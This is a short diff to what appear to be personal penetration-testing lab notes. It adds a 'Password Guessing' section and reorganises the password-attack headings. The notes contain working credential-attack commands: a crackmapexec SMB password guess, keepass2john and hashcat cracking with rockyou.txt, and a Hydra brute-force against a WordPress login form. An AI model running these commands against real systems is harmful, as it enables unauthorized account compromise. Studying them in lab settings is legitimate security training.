@@ -170,7 +170,9 @@ Remember, WP Plugins are exploitable. Verisons can be found in the source code
 
 Password guess: `crackmapexec smb 192.168.247.227 -u nadine -p /home/kali/rockyou.txt`
 
-# Password Cracking
+# Password Attacks
+
+## Password Cracking
 
 KeePass to hash -> `keepass2john [name].kdbx > hashfile`
 
@@ -180,3 +182,6 @@ Best Rule for cracking: `https://github.com/Unic0rn28/hashcat-rules/blob/main/ru
 
 Hashcat: `hashcat -a 0 -m 13400 pass.txt /home/kali/rockyou.txt -r /home/kali/Downloads/rules_full.rule`
 
+## Password Guessing
+
+Hydra HTTP Post: `hydra -l admin -P /home/kali/rockyou.txt 192.168.245.89 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:S=302"`
